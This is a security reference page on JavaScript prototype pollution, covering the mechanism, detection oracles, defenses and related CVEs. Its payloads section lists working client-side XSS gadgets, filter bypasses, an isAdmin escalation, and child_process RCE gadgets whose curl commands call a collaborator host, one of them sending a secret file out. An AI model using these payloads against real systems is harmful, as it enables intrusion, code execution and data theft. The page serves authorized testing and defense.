# Prototype Pollution

> Polluting Object.prototype in JS changes app behavior, enabling XSS/RCE/DoS. **Deep dive:** [`Troubleshooting_Guide/prototype_pollution.md`](../../../../Troubleshooting_Guide/prototype_pollution.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A03:2021 Injection
**Status:** complete

## What it is
Prototype pollution is a JavaScript flaw where an attacker injects properties into
`Object.prototype`, the object every other object inherits from. Because the change is global, it
silently alters how unrelated code behaves — and on its own becomes dangerous when a "gadget" later
reads the polluted property.

## How it works
JavaScript objects inherit from a prototype chain reachable via the special keys `__proto__` and
`constructor.prototype`. When an app recursively merges, clones, or sets nested properties from
attacker-controlled input (query string, JSON body, URL fragment) without filtering these keys, a
payload like `__proto__[isAdmin]=true` writes onto `Object.prototype`. Every object then appears to
have `isAdmin`. The pollution is inert until a **gadget** — code that reads a property the app
expected to be undefined (an HTML/script transport URL, a config flag, a `child_process` option)
— picks it up and turns it into XSS, privilege escalation, or RCE. Vulnerable merge utilities such
as old `lodash.merge` are classic sources.

## Impact
Client-side: DOM XSS via script-controlling gadgets and CSP-nonce forgery. Server-side (Node.js):
authorization bypass / privilege escalation (`isAdmin`), denial of service by corrupting shared
state, and remote code execution through gadgets in `child_process` spawn options
(`execArgv`, `shell`, `NODE_OPTIONS`). Severity ranges from medium to critical (RCE).

## How to detect
- Client: send `/?__proto__[canary]=ppstudy1`, then read `Object.prototype.canary` in the console;
  a non-undefined value confirms pollution.
- Server: use non-destructive oracles — `{"__proto__":{"json spaces":10}}` makes Express
  pretty-print JSON, and `{"__proto__":{"status":555}}` makes a malformed body reflect status 555.
- Loose merges/cloners and libraries with known pollution CVEs in the dependency tree.
- Filters that strip `__proto__`/`constructor` once (defeated by nesting) or block one key but not
  the `constructor.prototype` path.

## Exploitation (summary)
Find a controllable source that reaches a recursive property setter, confirm pollution with a
canary, then chain to a gadget: a `transport_url`/`sequence` gadget for client-side DOM XSS, an
`isAdmin` flag for privilege escalation, or `child_process` options for server-side RCE. Bypass
naive sanitizers by nesting the forbidden keys or using the `constructor.prototype` route. Full
payloads live in the Payloads section above.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Client-side detection
Pollute via the query string, then read `Object.prototype.foo` in the console.
```text
/?__proto__[foo]=bar
/?__proto__.foo=bar
/?constructor.prototype.foo=bar
/?__proto__[canary]=ppstudy1        # distinctive canary value
```

### Client-side DOM XSS gadgets
Pollution is only useful once it feeds a script-controlling gadget.
```text
/?__proto__[transport_url]=data:,alert(1);     # script src / transport gadget
/?__proto__.sequence=alert(1)-                 # eval() gadget; trailing - absorbs an appended 1
/?__proto__[value]=data:,alert(1);             # when transport_url is locked via defineProperty
/?__proto__[hitCallback]=alert(document.cookie) # via URL fragment
```
Deliver fragment-based gadgets from an exploit server:
```html
<script>location = "https://TARGET/#__proto__[hitCallback]=alert%28document.cookie%29";</script>
```
Other gadgets: `__proto__[nonce]=…` (forge a CSP nonce), `__proto__[toString]=polluted`
(break app logic via overridden `toString`/`valueOf`).

### Bypassing client-side sanitization
When the filter strips `__proto__` / `constructor` once, nest it so removal reconstitutes it.
```text
/?__pro__proto__to__[transport_url]=data:,alert(1);
/?constconstructorructor[protoprototypetype][foo]=bar
/?__pro__proto__to__[canary]=ppstudy1
```

### Server-side detection (non-destructive)
Express/Node config keys make good oracles.
```json
{ "__proto__": { "json spaces": 10 } }
```
A suddenly heavily-indented JSON response confirms pollution. With deliberately broken JSON:
```json
{ "__proto__": { "status": 555 } }
```
an error reflecting `status: 555` (instead of 400/500) confirms it. `content-type` with
`charset=utf-7` similarly reflects into response headers.

### Server-side `__proto__`-filter bypass
```json
{ "constructor": { "prototype": { "json spaces": 10 } } }
{ "__proto__": { "constructor": { "prototype": { "isAdmin": true } } } }
```

### Privilege escalation
```json
{ "__proto__": { "isAdmin": true } }
```

### Server-side RCE gadgets (`child_process`)
```json
{ "__proto__": { "execArgv": ["--eval=require('child_process').execSync('curl https://COLLABORATOR.oastify.com')"] } }
```
```json
{ "__proto__": { "shell": "vim", "input": ":! curl https://COLLABORATOR.oastify.com\n" } }
```
```json
{ "__proto__": { "env": { "NODE_OPTIONS": "--require=/proc/self/fd/0", "NODE_EXTRA_CA_CERTS": "/dev/stdin" } } }
```
Exfiltrate by piping into the same shell gadget:
```json
{ "__proto__": { "shell": "vim", "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://COLLABORATOR.oastify.com\n" } }
```

### Other sinks / known sources
```http
POST /api/search
Content-Type: application/x-www-form-urlencoded

__proto__[isAdmin]=true&query=test
```
```text
https://target.com/#{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}   # SPA hash-JSON
```
Vulnerable `lodash.merge` (CVE-2019-10744) accepts `{"constructor":{"prototype":{"isAdmin":true}}}`.

### Selection guide
| Goal | Payload |
|------|---------|
| Detect client-side | `/?__proto__[foo]=bar` |
| Client-side DOM XSS | `/?__proto__[transport_url]=data:,alert(1);` |
| Bypass client sanitization | `/?__pro__proto__to__[foo]=bar` |
| Detect server-side | `{ "__proto__": { "json spaces": 10 } }` |
| Privilege escalation | `{ "__proto__": { "isAdmin": true } }` |
| RCE (child_process) | `{ "__proto__": { "execArgv": ["--eval=…"] } }` |
| RCE via shell gadget | `{ "__proto__": { "shell": "vim", "input": ":! cmd\n" } }` |
| Bypass `__proto__` block | `{ "constructor": { "prototype": { … } } }` |

## Defenses
1. **Block the dangerous keys** — reject or strip `__proto__`, `constructor`, and `prototype` from
   keys in any input that drives a merge/clone/path-set, recursively (not once).
2. **Use pollution-safe data structures** — `Object.create(null)` for maps, the `Map` type for
   key/value data, and audited merge utilities (current lodash, or `Object.assign` on flat objects).
3. **Freeze the prototype** — `Object.freeze(Object.prototype)` to make pollution throw/fail.
4. **Validate input against a schema** so only expected properties are accepted (allowlist, not
   blocklist).
5. Keep dependencies patched (known-vulnerable merge libraries are a common source) and, in
   Node 12+, consider `--disable-proto=delete` to remove the `__proto__` accessor.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Prototype+Pollution
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Prototype+Pollution
- **Exploit-DB** — https://www.exploit-db.com/search?q=Prototype+Pollution
- **GitHub Advisories** — https://github.com/advisories?query=Prototype+Pollution
- **OSV** — https://osv.dev/list?q=Prototype+Pollution
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Prototype Pollution <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2019-10744` — lodash `defaultsDeep`/`merge` prototype pollution; one of the most widely
  depended-on advisories in the npm ecosystem.
- `CVE-2019-11358` — jQuery `$.extend(true, …)` prototype pollution (often chained to XSS).
- `CVE-2018-3721` / `CVE-2018-16487` — earlier lodash `merge`/`mergeWith` prototype pollution.

## References
- PortSwigger Web Security Academy — Prototype pollution.
- OWASP — Prototype Pollution Prevention Cheat Sheet.
- Node.js docs — `--disable-proto` flag and prototype-pollution guidance.
